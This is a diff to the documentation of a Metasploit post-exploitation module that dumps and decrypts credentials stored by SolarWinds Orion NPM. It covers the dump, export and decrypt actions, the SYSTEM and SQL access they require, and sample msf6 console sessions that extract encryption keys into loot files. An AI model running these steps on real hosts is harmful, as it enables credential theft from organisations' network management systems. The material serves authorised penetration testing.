@@ -1,3 +1,5 @@
+## Vulnerable Application
+
 This module exports and decrypts credentials from SolarWindows Orion Network Performance Monitor
 to a CSV file; it is intended as a post-exploitation module for Windows hosts with SolarWindows
 Orion NPM installed. The module supports decryption of AES-256, RSA, and XMLSEC secrets. Separate
@@ -12,10 +14,33 @@ and Atredis Partners:
 
 https://github.com/atredispartners/solarwinds-orion-cryptography
 
-## Vulnerable Application
+Meterpreter must be running in the context of SYSTEM in order to extract encryption keys.
 
-This is a post module and requires a meterpreter session on the Microsoft Windows server host
-with a configured instance of SolarWindows Orion Network Performance Monitor installed. 
+## Actions
+
+### Dump
+
+`dump` is the default action and performs extraction of the Orion database parameters and encryption keys.
+This action also exports Orion SQL data and immediately decrypts it. `dump` is suitable when the following
+conditions are met:
+
+1. The sqlcmd binary is available on the target system
+2. The machine account has access to the Orion database (if Windows Integrated) or Orion is using SQL native auth
+
+Invoking the `dump` action requires SYSTEM level permissions on the target host in order to extract AES keys.
+
+### Export
+
+`export` performs SQL data extraction of the encrypted data as a CSV file; use this option if it is necessary to
+migrate the Meterpreter session to a new non-SYSTEM identity in order to access the SQL database. Invoking the
+`export` action requires the Meterpreter session to be running in the context of a user that has access to the
+configured Orion SQL database.
+
+### Decrypt
+
+`decrypt` performs decryption of encrypted Orion SQL data. To invoke the `decrypt` action, you must also set the
+`CSV_FILE` advanced option or the `MSSQL_INSTANCE` and `MSSQL_DB` options, as well as the `AES_KEY` and
+`RSA_KEY_FILE` advanced options. See `SQL Data Acquisition` below for more information.
 
 ## Verification Steps
 
@@ -25,13 +50,7 @@ with a configured instance of SolarWindows Orion Network Performance Monitor ins
 4. Do: `set session <session>`
 5. Do: `dump` to extract and decrypt the Orion database, or `export` to extract the encrypted database only
 
-If `dump` or `export` fail, the session identity may need permission to log in to SQL; see `Scenarios` below.
-
-## Options
-
-### SESSION
-
-Which session to use, which can be viewed with `sessions -l`
+If `dump` or `export` fail, the session identity may need permission to log in to SQL; see `Scenarios`.
 
 ## Advanced Options
 
@@ -103,9 +122,6 @@ JOIN
   [dbo].[CredentialProperty] AS cp ON (c.ID=cp.CredentialID)
 ```
 
-Provide the path to this file in the `CSV_FILE` advanced option along with the `MSSQL_INSTANCE`,
-`MSSQL_DB`, `AES_KEY` and `RSA_KEY_FILE` to perform offline decryption using the `decrypt` action. 
-
 ### Examples
 
 Windows Server 2019 host running Orion NPM 2020 using the `dump` action:
@@ -117,7 +133,7 @@ session => 1
 msf6 post(windows/gather/credentials/solarwinds_orion_dump) > dump
 
 [*] Hostname WINNING IPv4 192.168.101.125
-[*] SolarWinds Orion Build 2020.26512
+[*] SolarWinds Orion Build 2020.2.65120.0
 [*] SolarWinds Orion Install Path: C:\Program Files (x86)\SolarWinds\Orion\
 [*] Init SolarWinds Crypto ...
 [*] Decrypt SolarWinds CryptoHelper Keystorage ...
@@ -164,7 +180,7 @@ session => 1
 msf6 post(windows/gather/credentials/solarwinds_orion_dump) > dump
 
 [*] Hostname WINNING IPv4 192.168.101.125
-[*] SolarWinds Orion Build 2020.26512
+[*] SolarWinds Orion Build 2020.2.65120.0
 [*] SolarWinds Orion Install Path: C:\Program Files (x86)\SolarWinds\Orion\
 [*] Init SolarWinds Crypto ...
 [*] Decrypt SolarWinds CryptoHelper Keystorage ...
@@ -221,7 +237,7 @@ meterpreter > bg
 msf6 post(windows/gather/credentials/solarwinds_orion_dump) > export
 
 [*] Hostname WINNING IPv4 192.168.101.125
-[*] SolarWinds Orion Build 2020.26512
+[*] SolarWinds Orion Build 2020.2.65120.0
 [*] SolarWinds Orion Install Path: C:\Program Files (x86)\SolarWinds\Orion\
 [*] Init SolarWinds Crypto ...
 [+] Orion AES Encryption Key
@@ -244,7 +260,7 @@ CSV_FILE => /root/.msf4/loot/20221118091938_default_192.168.101.125_solarwinds_o
 msf6 post(windows/gather/credentials/solarwinds_orion_dump) > decrypt 
 
 [*] Hostname WINNING IPv4 192.168.101.125
-[*] SolarWinds Orion Build 2020.26512
+[*] SolarWinds Orion Build 2020.2.65120.0
 [*] SolarWinds Orion Install Path: C:\Program Files (x86)\SolarWinds\Orion\
 [*] Init SolarWinds Crypto ...
 [+] Orion AES Encryption Key
